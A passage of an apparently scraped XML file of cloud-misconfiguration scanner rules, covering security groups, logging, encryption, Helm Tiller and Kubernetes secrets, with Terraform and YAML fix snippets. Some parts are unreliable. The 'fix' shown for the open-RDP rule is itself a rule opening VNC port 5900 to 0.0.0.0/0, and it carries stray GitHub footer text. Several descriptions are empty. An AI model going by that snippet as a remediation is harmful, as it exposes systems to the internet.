<li>In Inbound tab, Select the rule having 'Action' as Allow, 'Authorization Object' as 0.0.0.0/0 and 'Port Range' value as 3389, Click Modify in the Actions column</li>
<li>Replace the value 0.0.0.0/0 with specific IP address range.</li>
<li>Click on 'OK'</li>
</ol>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime---terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime-terraform"></div>Fix - Buildtime - Terraform</div><a aria-label="Skip link to Fix - Buildtime - Terraform" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime---terraform"></a></h1>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "alicloud_security_group_rule" "allow_all_vncserver" {
  type              = "ingress"
  ip_protocol       = "tcp"
  nic_type          = "internet"
  policy            = "accept"
  port_range        = "5900/5900"
  security_group_id = alicloud_security_group.default.id
  cidr_ip           = "0.0.0.0/0"
}
Footer
&#169; 2022 GitHub, Inc.
Footer navigation
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-no-alibaba-cloud-security-groups-allow-ingress-from-00000-to-port-3389' target='_blank'> https://docs.bridgecrew.io/docs/ensure-no-alibaba-cloud-security-groups-allow-ingress-from-00000-to-port-3389</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-no-alibaba-cloud-security-groups-allow-ingress-from-00000-to-port-3389' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_ALI_4</key>
    <name>Ensure Alibaba Cloud Action Trail Logging for all regions</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="alibaba-cloud-action-trail-logging-is-not-enabled-for-all-regions"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-alibaba-cloud-action-trail-logging-is-not-enabled-for-all-regions"></div>Alibaba Cloud Action Trail Logging is not enabled for all regions</div><a aria-label="Skip link to Alibaba Cloud Action Trail Logging is not enabled for all regions" class="heading-anchor-icon fa fa-anchor" href="#alibaba-cloud-action-trail-logging-is-not-enabled-for-all-regions"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime---terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime-terraform"></div>Fix - Buildtime - Terraform</div><a aria-label="Skip link to Fix - Buildtime - Terraform" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime---terraform"></a></h1>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "alicloud_actiontrail_trail" "pass" {
  trail_name         = "action-trail"
  oss_write_role_arn = "acs:ram::1182725xxxxxxxxxxx"
  oss_bucket_name    = "bucket_name"
  event_rw           = "All"
  trail_region       = "All"
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-action-trail-logging-for-all-regions' target='_blank'> https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-action-trail-logging-for-all-regions</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-action-trail-logging-for-all-regions' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_ALI_21</key>
    <name>Ensure Alibaba Cloud API Gateway API Protocol uses HTTPS</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="alibaba-cloud-api-gateway-api-protocol-does-not-use-https"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-alibaba-cloud-api-gateway-api-protocol-does-not-use-https"></div>Alibaba Cloud API Gateway API Protocol does not use HTTPS</div><a aria-label="Skip link to Alibaba Cloud API Gateway API Protocol does not use HTTPS" class="heading-anchor-icon fa fa-anchor" href="#alibaba-cloud-api-gateway-api-protocol-does-not-use-https"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime---terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime-terraform"></div>Fix - Buildtime - Terraform</div><a aria-label="Skip link to Fix - Buildtime - Terraform" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime---terraform"></a></h1>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "alicloud_api_gateway_api" "pass" {
  name              = alicloud_api_gateway_group.apiGroup.name
  group_id          = alicloud_api_gateway_group.apiGroup.id
  description       = "your description"
  auth_type         = "APP"
  force_nonce_check = false

  request_config {
    protocol = "HTTPS"
    method   = "GET"
    path     = "/test/path1"
    mode     = "MAPPING"
  }

  service_type = "HTTP"

  http_service_config {
    address   = "https://apigateway-backend.alicloudapi.com:8080"
    method    = "GET"
    path      = "/web/cloudapi"
    timeout   = 12
    aone_name = "cloudapi-openapi"
  }

  request_parameters {
    name         = "aaa"
    type         = "STRING"
    required     = "OPTIONAL"
    in           = "QUERY"
    in_service   = "QUERY"
    name_service = "testparams"
  }

  stage_names = [
    "RELEASE",
    "TEST",
  ]
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-api-gateway-api-protocol-uses-https' target='_blank'> https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-api-gateway-api-protocol-uses-https</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-api-gateway-api-protocol-uses-https' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_ALI_18</key>
    <name>Ensure Alibaba Cloud RAM password policy prevents password reuse</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="alibaba-cloud-ram-password-policy-does-not-prevent-password-reuse"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-alibaba-cloud-ram-password-policy-does-not-prevent-password-reuse"></div>Alibaba Cloud RAM password policy does not prevent password reuse</div><a aria-label="Skip link to Alibaba Cloud RAM password policy does not prevent password reuse" class="heading-anchor-icon fa fa-anchor" href="#alibaba-cloud-ram-password-policy-does-not-prevent-password-reuse"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime---terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime-terraform"></div>Fix - Buildtime - Terraform</div><a aria-label="Skip link to Fix - Buildtime - Terraform" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime---terraform"></a></h1>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "alicloud_ram_account_password_policy" "pass" {
  minimum_password_length      = 14
  require_lowercase_characters = false
  require_uppercase_characters = false
  require_numbers              = false
  require_symbols              = true
  hard_expiry                  = true
  max_password_age             = 14
  password_reuse_prevention    = 24
  max_login_attempts           = 3
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-ram-password-policy-prevents-password-reuse' target='_blank'> https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-ram-password-policy-prevents-password-reuse</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-ram-password-policy-prevents-password-reuse' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_ALI_7</key>
    <name>Ensure Alibaba Cloud Disk is encrypted</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="alibaba-cloud-disk-encryption-is-disabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-alibaba-cloud-disk-encryption-is-disabled"></div>Alibaba Cloud Disk encryption is disabled</div><a aria-label="Skip link to Alibaba Cloud Disk encryption is disabled" class="heading-anchor-icon fa fa-anchor" href="#alibaba-cloud-disk-encryption-is-disabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>This policy identifies disks for which encryption is disabled. As a best practice enable disk encryption to improve data security without making changes to your business or applications. Snapshots created from encrypted disks and new disks created from these snapshots are automatically encrypted.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="alibaba-cloud-portal"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-alibaba-cloud-portal"></div>Alibaba Cloud Portal</div><a aria-label="Skip link to Alibaba Cloud Portal" class="heading-anchor-icon fa fa-anchor" href="#alibaba-cloud-portal"></a></h2>
<p>Alibaba Cloud disk can only be encrypted at the time of disk creation. So to resolve this alert, create a new disk with encryption and then migrate all required disk data from the reported disk to this newly created disk.<br/>
To create an Alibaba Cloud disk with encryption:</p>
<ol>
<li>Log in to Alibaba Cloud Portal</li>
<li>Go to Elastic Compute Service</li>
<li>In the left-side navigation pane, click on 'Disks' which is under 'Storage &amp; Snapshots'\n4. Click on 'Create Disk'</li>
<li>Check the 'Disk Encryption' box in the 'Disk' section</li>
<li>Click on 'Preview Order' make sure parameters are chosen correctly</li>
<li>Click on 'Create', After you create a disk, attach that disk to other resources per your requirements.</li>
</ol>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime---terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime-terraform"></div>Fix - Buildtime - Terraform</div><a aria-label="Skip link to Fix - Buildtime - Terraform" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime---terraform"></a></h1>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "alicloud_disk" "pass" {
  # cn-beijing
  description = "Hello ecs disk."
  category    = "cloud_efficiency"
  size        = "30"
  encrypted   = true
  kms_key_id  = "2a6767f0-a16c-1234-5678-13bf*****"
  tags = {
    Name = "TerraformTest"
  }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-disk-is-encrypted' target='_blank'> https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-disk-is-encrypted</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-disk-is-encrypted' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV2_AWS_19</key>
    <name>Ensure all EIP addresses allocated to a VPC are attached to EC2 instances</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="not-all-eip-addresses-allocated-to-a-vpc-are-attached-to-ec2-instances"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-not-all-eip-addresses-allocated-to-a-vpc-are-attached-to-ec-2-instances"></div>Not all EIP addresses allocated to a VPC are attached to EC2 instances</div><a aria-label="Skip link to Not all EIP addresses allocated to a VPC are attached to EC2 instances" class="heading-anchor-icon fa fa-anchor" href="#not-all-eip-addresses-allocated-to-a-vpc-are-attached-to-ec2-instances"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Ensure that an Elastic IP (EIP) is allocated for each NAT gateway that you want to deploy within your AWS account. An EIP address is a static, public IP address designed for dynamic cloud computing. You can associate an AWS EIP address with any EC2 instance, VPC ENI or NAT gateway. A Network Address Translation (NAT) gateway is a device that helps enabling EC2 instances in a private subnet to connect to the Internet and prevent the Internet from initiating a connection with those instances. With Elastic IPs, you can mask the failure of an EC2 instance by rapidly remapping the address to another instance launched in your VPC</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> aws_eip, aws_instance</li>
<li><strong>Argument:</strong> <em>instance</em> and <em>vpc</em> of aws_eip</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_eip" "ok_eip" {
  instance = aws_instance.ec2.id
  vpc      = true
}

resource "aws_instance" "ec2" {
  ami               = "ami-21f78e11"
  availability_zone = "us-west-2a"
  instance_type     = "t2.micro"

  tags = {
    Name = "HelloWorld"
  }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-all-eip-addresses-allocated-to-a-vpc-are-attached-to-ec2-instances' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-all-eip-addresses-allocated-to-a-vpc-are-attached-to-ec2-instances</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-all-eip-addresses-allocated-to-a-vpc-are-attached-to-ec2-instances' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_K8S_34</key>
    <name>Ensure Tiller (Helm V2) is not deployed</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="tiller-helm-v2-is-deployed"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-tiller-helm-v-2-is-deployed"></div>Tiller (Helm V2) is deployed</div><a aria-label="Skip link to Tiller (Helm V2) is deployed" class="heading-anchor-icon fa fa-anchor" href="#tiller-helm-v2-is-deployed"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Tiller (Helm v2) is the in-cluster component of Helm. It interacts directly with the Kubernetes API server to install, upgrade, query, and remove Kubernetes resources. It also stores the objects that represent releases. Its permissive configuration could grant the users a broad range of permissions.</p>
<p>New versions of Kubernetes and Helm v3 have made Tiller obsolete, with its over permissive function in existing workloads remaining a security liability.</p>
<p>Consider upgrading to use Helm v3, which only runs on client machines. Not all charts may support Helm 3, but the number that do is growing rapidly.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<p><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">helm reset</code></p>
<p>Or, use <button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">helm reset --force</code> to force the removal if charts are installed. You still need to remove the releases manually.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="kubernetes"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kubernetes"></div>Kubernetes</div><a aria-label="Skip link to Kubernetes" class="heading-anchor-icon fa fa-anchor" href="#kubernetes"></a></h2>
<ul>
<li><strong>Resource</strong>: Container</li>
<li><strong>Arguments</strong>:<br/>
labels:app / name - specifies the app label for the pod<br/>
image - defines the image used by the container</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">apiVersion: v1
kind: Pod
metadata:
  name: &lt;name&gt;
  labels:
-   app: helm
-   name: tiller
spec:
  containers:
  - name: &lt;container name&gt;
-   image: tiller
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_k8s_32' target='_blank'> https://docs.bridgecrew.io/docs/bc_k8s_32</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_k8s_32' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_K8S_35</key>
    <name>Use secrets as files instead of environment variables</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="secrets-used-as-environment-variables"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-secrets-used-as-environment-variables"></div>Secrets used as environment variables</div><a aria-label="Skip link to Secrets used as environment variables" class="heading-anchor-icon fa fa-anchor" href="#secrets-used-as-environment-variables"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Secrets can be mounted as data volumes or exposed as environment variables and used by a container in a pod to interact with external systems on your behalf. Secrets can also be used by other parts of the system, without being directly exposed to the pod. </p>
<p>Benefits for storing secrets as files include: setting file permissions, projects of secret keys to specific paths, and consuming secret values from volumes.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="kubernetes"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kubernetes"></div>Kubernetes</div><a aria-label="Skip link to Kubernetes" class="heading-anchor-icon fa fa-anchor" href="#kubernetes"></a></h2>
<ul>
<li><strong>Resource</strong>: Container</li>
<li><strong>Arguments</strong>:<br/>
env:valueFrom:secretKeyRef - uses a secret in an environment variable in a Pod<br/>
envFrom:secretRef - defines all of the secret&#8217;s data as the container environment variables</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">valueFrom</button><button type="button">envFrom</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="valueFrom">apiVersion: v1
kind: Pod
metadata:
  name: &lt;pod name&gt;
spec:
  containers:
  - name: &lt;container name&gt;
    image: &lt;image&gt;
    env:
      - name: &lt;env name&gt;
        valueFrom:
-         secretKeyRef:
-           name: &lt;secret key name&gt;
-           key: &lt;secret key&gt;
</code></pre><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="envFrom">apiVersion: v1
kind: Pod
metadata:
  name: &lt;pod name&gt;
spec:
  containers:
    - name: &lt;contianer name&gt;
      image: &lt;image&gt;
      envFrom:
-     - secretRef:
-         name: &lt;secret name&gt;
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_k8s_33' target='_blank'> https://docs.bridgecrew.io/docs/bc_k8s_33</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_k8s_33' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV2_AWS_33</key>
    <name>Ensure AWS AppSync is protected by WAF</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-appsync-is-not-protected-by-waf"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-app-sync-is-not-protected-by-waf"></div>AWS AppSync is not protected by WAF</div><a aria-label="Skip link to AWS AppSync is not protected by WAF" class="heading-anchor-icon fa fa-anchor" href="#aws-appsync-is-not-protected-by-waf"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-aws-appsync-is-protected-by-waf' target='_blank'> https://docs.bridgecrew.io/docs/ensure-aws-appsync-is-protected-by-waf</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-aws-appsync-is-protected-by-waf' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_145</key>
    <name>Ensure S3 buckets are encrypted with KMS by default</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="s3-buckets-are-not-encrypted-with-kms"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-s-3-buckets-are-not-encrypted-with-kms"></div>S3 buckets are not encrypted with KMS</div><a aria-label="Skip link to S3 buckets are not encrypted with KMS" class="heading-anchor-icon fa fa-anchor" href="#s3-buckets-are-not-encrypted-with-kms"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>TBA</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> aws_s3_bucket</li>
<li><strong>Argument:</strong> pply_server_side_encryption_by_default.kms_master_key_id</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_s3_bucket" "mybucket" {
  ...
  server_side_encryption_configuration {
    rule {
      apply_server_side_encryption_by_default {
        kms_master_key_id = aws_kms_key.mykey.arn
 +      sse_algorithm     = "aws:kms"
      }
    }
  }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-s3-buckets-are-encrypted-with-kms-by-default' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-s3-buckets-are-encrypted-with-kms-by-default</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-s3-buckets-are-encrypted-with-kms-by-default' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_K8S_37</key>
    <name>Ensure admission of containers with capabilities assigned is limited</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="admission-of-containers-with-capabilities-assigned-is-not-limited"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-admission-of-containers-with-capabilities-assigned-is-not-limited"></div>Admission of containers with capabilities assigned is not limited</div><a aria-label="Skip link to Admission of containers with capabilities assigned is not limited" class="heading-anchor-icon fa fa-anchor" href="#admission-of-containers-with-capabilities-assigned-is-not-limited"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Docker has a default list of capabilities that are allowed for each container of a pod. The containers use the capabilities from this default list, but pod manifest authors can alter it by requesting additional capabilities, or dropping some of the default capabilities.</p>
<p>Limiting the admission of containers with capabilities ensures that only a small number of containers have extended capabilities outside the default range. This helps ensure that if a container becomes compromised it is unable to provide a productive path for an attacker to move laterally to other containers in the pod.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="kubernetes"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kubernetes"></div>Kubernetes</div><a aria-label="Skip link to Kubernetes" class="heading-anchor-icon fa fa-anchor" href="#kubernetes"></a></h2>
<ul>
